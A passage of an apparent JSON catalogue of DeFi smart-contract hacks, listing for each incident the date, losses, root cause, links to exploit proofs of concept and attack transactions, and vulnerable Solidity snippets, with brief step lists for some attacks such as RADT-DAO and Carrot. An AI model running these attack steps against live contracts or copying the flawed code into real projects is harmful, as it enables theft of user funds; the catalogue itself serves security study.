poolInfo[_pid];\n        if (now <= pool.lastRewardTime) {\n            return;\n        }\n        uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n        if (lpSupply == 0) {\n            pool.lastRewardTime = now;\n            return;\n        }\n        if (!pool.isStarted) {\n            pool.isStarted = true;\n            totalAllocPoint = totalAllocPoint.add(pool.allocPoint);\n        }\n        if (totalAllocPoint > 0) {\n            uint256 _time = now.sub(pool.lastRewardTime);\n            uint256 _sdoReward = _time.mul(rewardPerSecond).mul(pool.allocPoint).div(totalAllocPoint);\n            **pool.accSdoPerShare** = pool.accSdoPerShare.add(_sdoReward.mul(1e18).div(lpSupply)); // manipulate lpSupply to 2\n        }\n        pool.lastRewardTime = now;\n    }"
    },
    {
        "type": "Dex/AMM, Flashloans, Insufficient validation, Reentrancy",
        "date": "20220313",
        "lost": "$1.7 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220313-paraluni---flashloan--reentrancy",
        "title": "Paraluni",
        "root_cause": "reentrancy & insufficient validation. The depositByAddLiquidity function calls an internal depositByAddLiquidityInternal function that transfers the attacker's deposit into the appropriate pool.  However the pool ID value (_pid) used to look up the appropriate pool [is not validated internally](https://netfreeman.com/2022/03/202203132332576318.html). \n\nThe attacker takes advantage of this by directing this to an attacker-controlled contract, [whose malicious transferFrom function is called](https://coincodecap.com/paraluni-hacked-reportedly-1-7m-lost).  This function then exploits the reentrancy vulnerability to call the Masterchef deposit function before the internal state is updated.  Between the initial and malicious deposits, the attacker is credited with excess tokens and able to extract more value from the contract than they deposited.",
        "vulnerable_code_snippet": "function depositByAddLiquidity(uint256 _pid, address[2] memory _tokens, uint256[2] memory _amounts) external{ require(_amounts[0] > 0 && _amounts[1] > 0, \"!0\"); address[2] memory tokens; uint256[2] memory amounts; (tokens[0], amounts[0]) = _doTransferIn(msg.sender, _tokens[0], _amounts[0]); (tokens[1], amounts[1]) = _doTransferIn(msg.sender, _tokens[1], _amounts[1]); depositByAddLiquidityInternal(msg.sender, _pid, tokens,amounts); } function depositByAddLiquidityInternal(address _user, uint256 _pid, address[2] memory _tokens, uint256[2] memory _amounts) internal { PoolInfo memory pool = poolInfo[_pid]; require(address(pool.ticket) == address(0), \"T:E\"); uint liquidity = addLiquidityInternal(address(pool.lpToken), _user, _tokens, _amounts); _deposit(_pid, liquidity, _user); }",
        "analysis": "The depositByAddLiquidity function calls an internal depositByAddLiquidityInternal function that transfers the attacker's deposit into the appropriate pool.  However the pool ID value (_pid) used to look up the appropriate pool [is not validated internally](https://netfreeman.com/2022/03/202203132332576318.html). \n\nThe attacker takes advantage of this by directing this to an attacker-controlled contract, [whose malicious transferFrom function is called](https://coincodecap.com/paraluni-hacked-reportedly-1-7m-lost).  This function then exploits the reentrancy vulnerability to call the Masterchef deposit function before the internal state is updated.  Between the initial and malicious deposits, the attacker is credited with excess tokens and able to extract more value from the contract than they deposited."
    },
    {
        "type": "Arbitrary call",
        "date": "20240228",
        "lost": "6M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/Seneca_exp.sol",
        "title": "Seneca",
        "root_cause": "The `performoperations()`  in Seneca which uses the parameters passed in to choose to execute different function logic. When the user specifies action as 30, the function will choose to call the _call(). The attacker directly calls the performOperations function and constructs the following parameters. Actions is passed in the above 30, and the _call function is called.",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/eth/0x23fcf9d4517f7cc39815b09b0a80c023ab2c8196c826c93b4100f2e26b701286",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1763045563040411876",
        "vulnerable_code_snippet": "function performOperations(\nuint8[] calldata actions,\nuint256[] calldata values,\nbytes[] calldata datas\n) whenNotPaused external payable returns (uint256 value1, uint256 value2) {\nOperationStatus memory status;\nuint256 actionsLength = actions.length;\nfor (uint256 i = 0; i < actionsLength; i++) {\nuint8 action = actions[i];\nif (!status.hasAccrued && action < 10) {\naccumulate();\nstatus.hasAccrued = true;\n} ... else if (action == Constants.OPERATION_CALL) {\n(bytes memory returnData, uint8 returnValues) = _call(values[i], datas[i], value1, value2);\nif (returnValues == 1) {\n(value1) = abi.decode(returnData, (uint256));\n} else if (returnValues == 2) {\n(value1, value2) = abi.decode(returnData, (uint256, uint256));\n} ... uint8 public constant OPERATION_CALL = 30;"
    },
    {
        "type": "ERC20, Flashloans",
        "date": "20220923",
        "lost": "$94,304",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220923-RADT-DAO---pair-manipulate",
        "title": "RADT-DAO",
        "root_cause": "front running",
        "REF": "https://twitter.com/BlockSecTeam/status/1573252869322846209",
        "attack_tx": null,
        "analysis": [
            "Borrow USDT via flashloan",
            "Partially swap USDT for RADT-DAO token in the Pancake pool",
            "Trigger the fallback function of the RADT-DAO contract to transfer the remaining RADT-DAO in the Pancake pool",
            "Swap RADT-DAO (from Step 2) for USDT",
            "Return the flashloan"
        ]
    },
    {
        "type": "Arbitrary call, Yield",
        "date": "20221010",
        "title": "Carrot",
        "root_cause": "public function call, call transferowner 0xbf699b4b. All wallets granted approvals are impacted.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221010-carrot---public-functioncall",
        "analysis": "Step1, transReward to set owner.\n\nStep2, transferFrom.",
        "vulnerable_code": "https://bscscan.com/address/0xcFF086EaD392CcB39C49eCda8C974ad5238452aC#code#L1406",
        "pool_contract": "0x6863b549bf730863157318df4496ed111adfa64f",
        "vulnerable_code_snippet": "function transReward(bytes memory data) public { //data is controllable\n        pool.functionCall(data); //vulnerable point\n    } ... def unknownbf699b4b(uint256 _param1): # not payable\n require calldata.size - 4 >= 32\n require _param1 == addr(_param1)\n if ext_code.size(owner) > 0:\n  stor3 = 1\n if stor3:\n  require owner == caller\n else:\n  if owner != caller:\n   require stor1[caller]\n owner = addr(_param1)"
    },
    {
        "type": "Insufficient validation",
        "date": "20240329",
        "title": "PrismaFi",
        "root_cause": "A vulnerability in both versions of the MigrateTroveZap (mkUSD and ULTRA) contracts of Prisma Finance led to an exploit. In response, Prisma Finance's emergency multi-sig paused the protocol's operations. The special-purpose contract, designed to migrate user positions between trove managers, was exploited due to a lack of input validation in the onFlashloan function. By directly calling the flashloan() function, the exploiter could manipulate other trove managers' positions, taking advantage of the mismatch between the collateral in the initial and new positions. This allowed the exploiter to take the difference in collateral. A thorough investigation is underway to identify the root cause and implement fixes. Trove owners should verify they have revoked any active approvals for the MigrateTroveZap. By directly calling the flashloan() function, the exploiter could manipulate other Trove Managers' positions. The contract allowed for a mismatch between the collateral in the initial position and the collateral in the new position, with the difference being susceptible to being taken.",
        "attack_tx": "https://etherscan.io/tx/0x00c503b595946bccaea3d58025b5f9b3726177bbdc9674e634244135282116c7",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Prisma_exp.sol",
        "analysis": [
            "https://twitter.com/EXVULSEC/status/1773371049951797485",
            "https://twitter.com/PrismaFi/status/1773371030129524957"
        ],
        "lost": "$11M",
        "vulnerable_code_snippet":"function onFlashLoan(\n    address,\n    address,\n    uint256 amount,\n    uint256 fee,\n    bytes calldata data\n) external returns (bytes32) {\n    require(msg.sender == address(debtToken), \"!DebtToken\");\n    (\n        address account,\n        address troveManagerFrom,\n        address troveManagerTo,\n        uint256 maxFeePercentage,\n        uint256 coll,\n        address upperHint,\n        address lowerHint\n    ) = abi.decode(data, (address, address, address, uint256, uint256, address, address));\n    uint256 toMint = amount + fee;\n    borrowerOps.closeTrove(troveManagerFrom, account);\n    borrowerOps.openTrove(troveManagerTo, account, maxFeePercentage, coll, toMint, upperHint, lowerHint);\n    return _RETURN_VALUE;\n}"
    },
    {
        "type": "Business Logic Flaw, Reward",
        "date": "20240506",
        "title": "OSN",
        "root_cause": "Distribution contract did not check the LP hold time or whether the reciever is contract or not",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0xc7927a68464ebab1c0b1af58a5466da88f09ba9b30e6c255b46b1bc2e7d1bf09",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/OSN_exp.sol",
        "analysis": "https://x.com/SlowMist_Team/status/1787330586857861564",
        "attacker": "https://bscscan.com/address/0x810f4c6ae97bcc66da5ae6383cc31bd3670f6d13",
        "lost": "109K USD",
        "tx_help_contract": "https://app.blocksec.com/explorer/tx/bsc/0xbf22eabb5db8785642ba17930bddef48d0d1bb94ebd1e03e7faa6f2a3d1a5540",
        "tx_liq": "https://app.blocksec.com/explorer/tx/bsc/0x69c64b226f8bf06216cc665ad5e3777ad1b120909326f120f0816ac65a9099c0"
    },
    {
        "type": "Flashloans",
        "date": "20230712",
        "lost": "$80k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/WGPT_exp.sol",
        "title": "WGPT",
        "root_cause": "In `transferFrom()`, the victim contract will swap `$USDT` in the contract for `$WGPT`, thereby raising the price of `$WGPT`. \nThe attacker calls transferFrom multiple times to deposit into the pair and withdraws it through the skim function, repeatedly increasing the price of `$WGPT`. \nFinally, the attacker profits by swapping the held `$WGPT` \u2192 `$USDT`.",
        "attack_tx": "https://bscscan.com/tx/0x258e53526e5a48feb1e4beadbf7ee53e07e816681ea297332533371032446bfd",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1679042549946933248",
        "vulnerable_code_snippet":"// SPDX-License-Identifier: Unlicensed\npragma solidity ^0.6.12;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}\ncontract Ownable {\n    address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    function transferOwnship(address newowner) public onlyOwner returns (bool) {\n        owner = newowner;\n        return true;\n    }\n}\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\ninterface IUniswapV2Pair {\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\n    function factory() external view returns (address);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function kLast() external view returns (uint);\n\n    function mint(address to) external returns (uint liquidity);\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n\n    function initialize(address, address) external;\n}\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n    external\n    payable\n    returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n    external\n    returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n    external\n    returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n    external\n    payable\n    returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\nabstract contract Context{\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal pure virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\ncontract AiWGPTToken is Ownable {\n    string public name = \"Wrapped GPT\";\n    string public symbol = \"WGPT\";\n    uint8 public decimals = 18;\n    uint256 public totalSupply = 21000000 * 10 ** 18;\n    address public swapLPAddr = address(0x0); \n    address public rateAddr = address(0x0); \n    uint256 public buyRate = 500;  \n    uint256 public burnRate = 2000;  \n    uint256 public lpPrice;   \n    bool public burnToken = true;  \n    bool public isSwap = false;     \n    uint256 public lpNumber = 1000000000000000;   \n    address swapV2RouterAddr = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address usdtAddr = address(0x55d398326f99059fF775485246999027B3197955);\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    mapping(address => bool) public _swapPairList;  \n    mapping(address => bool) public _WhiteList; \n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    IUniswapV2Router02 public uniswapV2Router;\n    constructor () public {\n        balanceOf[msg.sender] = totalSupply;\n        emit Transfer(address(0), msg.sender, totalSupply);\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(swapV2RouterAddr);\n        uniswapV2Router = _uniswapV2Router;\n    }\n    function setSwapLPAddr(address _addr) public onlyOwner returns (bool) {\n        swapLPAddr = _addr;  \n    }\n    function setlpNumber(uint256 _value) public onlyOwner returns (bool) {\n        lpNumber = _value;  \n    }\n    function setRateAddr(address _addr) public onlyOwner returns (bool) {\n        rateAddr = _addr;  \n    }\n    function setBurnToken(bool _value) public onlyOwner returns (bool) {\n         burnToken = _value;  \n    }\n    function setIsSwap(bool _value) public onlyOwner returns (bool) {\n         isSwap = _value;  \n    }\n    function setBurnRate(uint256 _value) public onlyOwner returns (bool) {\n        burnRate = _value;\n    }\n    function setRate(uint256 _value) public onlyOwner returns (bool) {\n        buyRate = _value;\n    }\n    function addWhiteList(address _addr)public onlyOwner returns(bool){\n        _WhiteList[_addr] = true;\n    }\n    function delWhiteList(address _addr)public onlyOwner returns(bool){\n        _WhiteList[_addr] = false;\n    }\n    function addSwapPair(address _addr)public onlyOwner returns(bool){\n        _swapPairList[_addr] = true;\n    }\n    function delSwapPair(address _addr)public onlyOwner returns(bool){\n        _swapPairList[_addr] = false;\n    }\n    function approve(address _spender, uint256 _value) public returns (bool success) {\n        allowance[msg.sender][_spender] = _value;\n        emit Approval(msg.sender, _spender, _value);\n        return true;\n    }\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(balanceOf[msg.sender] >= _value, \"Insufficient balance\");\n        balanceOf[msg.sender] -= _value;\n        if(_swapPairList[msg.sender] && _to != address(this) && _to != address(0x0)){  \n            if(isSwap || _WhiteList[_to]){      \n                balanceOf[_to] += _value - callfee(_value);\n                balanceOf[rateAddr] += callfee(_value);\n                emit Transfer(msg.sender, _to, _value - callfee(_value));\n                emit Transfer(msg.sender, rateAddr, callfee(_value));\n                return true;\n            }else{\n                return false;\n            }\n        }else{                               \n            balanceOf[_to] += _value;\n            emit Transfer(msg.sender, _to, _value);\n            return true;\n        }\n    }\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n        require(balanceOf[_from] >= _value, \"Insufficient balance\");\n        require(allowance[_from][msg.sender] >= _value, \"Not enough allowance\");\n        if(_swapPairList[_to]){                     \n            if(isSwap || _WhiteList[_from]){        \n                if(burnToken){                      \n                    sellburnToken(callBurn(_value));          \n                }\n                balanceOf[_from] -= _value;\n                balanceOf[_to] += _value;\n                allowance[_from][msg.sender] -= _value;\n                emit Transfer(_from, _to, _value);\n            }\n        }else if(_swapPairList[_from]){             \n            if(isSwap || _WhiteList[_to]){\n                balanceOf[_to] += _value - callfee(_value);\n                balanceOf[rateAddr] += callfee(_value);\n                emit Transfer(msg.sender, _to, _value - callfee(_value));\n                emit Transfer(msg.sender, rateAddr, callfee(_value));\n            }\n        }else{                                      \n            balanceOf[_from] -= _value;\n            balanceOf[_to] += _value;\n            allowance[_from][msg.sender] -= _value;\n            emit Transfer(_from, _to, _value);\n        }\n        return true; \n    }\n    function callfee(uint256 _value)public view returns(uint256){\n        return _value * buyRate / 10000;\n    }\n    function callBurn(uint256 _value)public view returns(uint256){\n        return _value * burnRate / 10000;\n    }\n    function callPrice()private returns(uint256){\n        uint256 tokenBalance = IERC20(address(this)).balanceOf(swapLPAddr);\n        tokenBalance = tokenBalance * 10 ** 18;\n        uint256 lpBalance = IERC20(swapLPAddr).totalSupply();\n        lpPrice = tokenBalance / lpBalance;\n        return lpPrice*2;\n    }\n    function sellburnToken(uint256 _value)private returns(bool){\n        (uint amountA, uint amountB) = removeLp((_value * 10**18 / callPrice()) + lpNumber);\n        usdtToToken(_value - amountB);\n        burnToekn(amountB);\n        return true;\n    }\n    function removeLp(uint _liquidity)private returns(uint amountA, uint amountB){\n        address tokenA = usdtAddr;\n        address tokenB = address(this);\n        uint liquidity = _liquidity;\n        uint amountAMin = 10;\n        uint amountBMin = 10;\n        address to = address(this);\n        uint deadline = block.timestamp + 600; \n        return uniswapV2Router.removeLiquidity(tokenA,tokenB,liquidity,amountAMin,amountBMin,to,deadline);\n    }\n    function usdtToToken(uint256 _amountOut)private returns(uint[] memory amounts){\n        uint256 amountOut = _amountOut;\n        uint256 amountInMax = IERC20(usdtAddr).balanceOf(address(this));\n        address[] memory path = new address[](2);\n        path[0] = usdtAddr;\n        path[1] = address(this);\n        address to = address(0x0);\n        uint256 deadline = block.timestamp + 600;\n        return uniswapV2Router.swapTokensForExactTokens(amountOut,amountInMax,path,to,deadline);\n    }\n    function burnToekn(uint256 _amount)private returns(bool){\n        balanceOf[address(this)] -= _amount;\n        balanceOf[address(0x0)] += _amount;\n        emit Transfer(address(this), address(0x0), _amount);\n        return true;\n    }\n    function ApprovalUsdtForRouter()public onlyOwner returns(bool){\n        uint256 amount = 999999999999 * 10 ** 18;\n        return IERC20(usdtAddr).approve(swapV2RouterAddr,amount);   \n    }\n    function ApprovaLp()public onlyOwner returns(bool){\n        uint256 amount = 999999999999 * 10 ** 18;\n        return IERC20(swapLPAddr).approve(swapV2RouterAddr,amount);\n    }\n    function withdraw(address token,address _to,uint256 amount) public onlyOwner returns(bool) {\n        return IERC20(token).transfer(_to,amount);\n    }\n    \n}"          
    },
    {
        "type": "Slippage",
        "date": "20231106",
        "title": "TheStandard_io",
        "lost": "$290K",
        "root_cause": "There is no slippage protection when swapping out collateral. There is no protection against bad debt. There is no whitelist of tokens to trade. As a result, the attacker could force the vault contract to swap in a low-liquidity pool which is manipulated. As a result, all collaterals are lost.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/arbitrum/0x51293c1155a1d33d8fc9389721362044c3a67e0ac732b3a6ec7661d47b03df9f",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/TheStandard_io_exp.sol",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1721807569222549518",
        "vulnerable_code_snippet": "function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external onlyOwner {\n        uint256 swapFee = _amount * ISmartVaultManagerV2(manager).swapFeeRate() / ISmartVaultManager(manager).HUNDRED_PC();\n        address inToken = getSwapAddressFor(_inToken);\n        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({\n                tokenIn: inToken,\n                tokenOut: getSwapAddressFor(_outToken),\n                fee: 3000,\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountIn: _amount - swapFee,\n                amountOutMinimum: 0,\n                sqrtPriceLimitX96: 0\n            });\n        inToken == ISmartVaultManagerV2(manager).weth() ?\n            executeNativeSwapAndFee(params, swapFee) :\n            executeERC20SwapAndFee(params, swapFee);\n    }"
    },
    {
        "type": "ERC721, Reentrancy",
        "date": "20221001",
        "title": "Thunder Brawl",
        "fixed": "unfixed",
        "root_cause": "claimReward() - rewards are being drained due to a reentrancy bug.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221001-thunder-brawl---reentrancy",
        "vulnerable_code_snippet": "function claimReward(\n        uint256 _ID,\n        address payable _player,\n        uint256 _amount,\n        bool _rewardStatus,\n        uint256 _x,\n        string memory name,\n        address _add\n    ) external {\n        require(gameMode);\n        bool checkValidity = guess(_x, name, _add);\n\n        if (checkValidity == true) {\n            if (winners[_ID][_player] == _amount) {\n                _player.transfer(_amount * 2);\n                if (_rewardStatus == true) {\n                    sendReward(); //vulnerable point\n                }\n                delete winners[_ID][_player];\n            } else {\n                if (_rewardStatus == true) {\n                    sendRewardDys();\n                }\n            }\n            rewardStatus = false;\n        }\n    }\n\nfunction sendReward() public {\n        thunderbrawlRoulette.reward(msg.sender, 1);\n    }\n\n...\n\nfunction reward(address to,uint256 _mintAmount) external {\n        uint256 supply = totalSupply();\n        uint256 rewardSupply = rewardTotal;\n        require(rewardSupply <= rewardSize,\"\"\");\n        for (uint256 i = 1; i <= _mintAmount; i++) {          \n          _safeMint(to, supply + i); \n          rewardTotal++;         \n        }\n  }\n/**\n     * @dev Same as {xref-ERC721-_safeMint-address-uint256-}[`_safeMint`], with an additional `data` parameter which is\n     * forwarded in {IERC721Receiver-onERC721Received} to contract recipients.\n     */\n    function _safeMint(\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) internal virtual {\n        _mint(to, tokenId);\n        require(\n            _checkOnERC721Received(address(0), to, tokenId, data), //callback \n            \"ERC721: transfer to non ERC721Receiver implementer\"\n        );\n    }",
        "attack_tx": null,
        "analysis": "The vulnerable code snippet demonstrates a reentrancy attack scenario. The `sendReward()` function within the Thunder Brawl contract calls the `reward()` function of another contract (`thunderbrawlRoulette`). This call allows an attacker to execute malicious code within their own contract before the original contract's execution finishes, resulting in the draining of rewards."
    },
    {
        "type": "Insufficient validation, Reentrancy, Yield",
        "date": "20211218",
        "title": "Grim Finance",
        "root_cause": "Insufficient validation & Reentrancy. Due to token is controllable, the attacker can send fake tokens to the GrimBoostVault through the fake contract created by attacker. Then successful to mint protocol token.",
        "lost": "$30 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20211218-grim-finance---flashloan--reentrancy",
        "vulnerable_code": "https://ftmscan.com/address/0x660184ce8af80e0b1e5a1172a16168b15f4136bf#code#L1115",
        "analysis": "Due to token is controllable, the attacker can send fake tokens to the GrimBoostVault through the fake contract created by attacker. Then successful to mint protocol token.",
        "vulnerable_code_snippet": "function depositFor(address token, uint _amount,address user ) public {\n\n        uint256 _pool = balance();\n        IERC20(token).safeTransferFrom(msg.sender, address(this), _amount); //vulnerable point\n        earn();\n        uint256 _after = balance();\n        _amount = _after.sub(_pool); // Additional check for deflationary tokens\n        uint256 shares = 0;\n        if (totalSupply() == 0) {\n            shares = _amount;\n        } else {\n            shares = (_amount.mul(totalSupply())).div(_pool);\n        }\n        _mint(user, shares);\n    }"
    },
    {
        "type": "Misconfiguration",
        "date": "20230413",
        "lost": "$11.6M",
        "title": "yearnFInance",
        "root_cause": "Set bZxUSDC address instead of bZxUSDT. It seems like the iearn USDT token (yUSDT) has been broken since deploy, which was checks notes over 1000 days ago. It was misconfigured to use the Fulcrum iUSDC token instead of the Fulcrum iUSDT token.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/YearnFinance_exp.sol",
        "attack_tx": [
            "https://etherscan.io/tx/0x055cec4fa4614836e54ea2e5cd3d14247ff3d61b85aa2a41f8cc876d131e0328",
            "https://etherscan.io/tx/0xd55e43c1602b28d4fd4667ee445d570c8f298f5401cf04e62ec329759ecda95d"
        ],
        "analysis": [
            "https://twitter.com/cmichelio/status/1646422861219807233",
            "https://twitter.com/BeosinAlert/status/1646481687445114881"
        ],
        "vulnerable_code_snippet":"constructor() public ERC20Detailed(\"iearn USDT\", \"yUSDT\", 6) {\n\tfulcrum = address(0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f);  // misconfigured\n}"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240419",
        "title": "HedgeyFinance",
        "root_cause": "Incorrect logic, After the user cancels the campaign, the contract withdraws all the locked tokens to the campaign manager. The vulnerability lies in the failure to revoke the allowance for the campaign manager.",
        "attack_tx": "https://etherscan.io/tx/0x2606d459a50ca4920722a111745c2eeced1d8a01ff25ee762e22d5d4b1595739",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/HedgeyFinance_exp.sol",
        "vulnerable_code": "https://etherscan.io/address/0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511#code",
        "analysis": [
            "https://x.com/Cube3AI/status/1781294512716820918",
            "https://medium.com/@CUBE3AI/hedgey-finance-hack-detected-by-cube3-ai-minutes-before-exploit-1f500e7052d4"
        ],
        "lost": "48M USD",
